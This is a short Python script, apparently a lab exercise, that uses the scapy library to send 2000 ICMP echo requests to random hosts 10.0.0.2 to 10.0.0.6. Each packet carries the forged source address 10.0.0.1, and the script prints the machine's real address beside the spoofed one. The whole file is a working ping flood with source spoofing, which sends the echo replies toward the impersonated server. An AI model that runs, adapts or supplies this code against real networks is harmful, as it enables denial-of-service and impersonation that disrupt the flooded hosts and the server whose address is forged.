from scapy.all import *
import random
import socket
import time
hostName = socket.gethostname()
IPAddr = socket.gethostbyname(hostName)
def pingFlood():
    #randBit = random.randint(2, 6)
    #primaryServer = "10.0.0.1"
    #spoofedSrc = "10.0.0." + str(randBit)
    for y in range(2000):
        randBit = random.randint(2, 6)
        #randTime = random.randint(1, 5)
        primaryServer = "10.0.0.1"
        spoofedSrc = "10.0.0." + str(randBit)
        L3 = IP(src = primaryServer, dst =
        spoofedSrc)
        L4 = ICMP()
        print("RealSrc IP = ", IPAddr, " || ",
        "SpoofedIP = ", primaryServer, " ===> ",
        spoofedSrc)
        pingReq = L3/L4
        #time.sleep(randTime)
        send(pingReq)
pingFlood()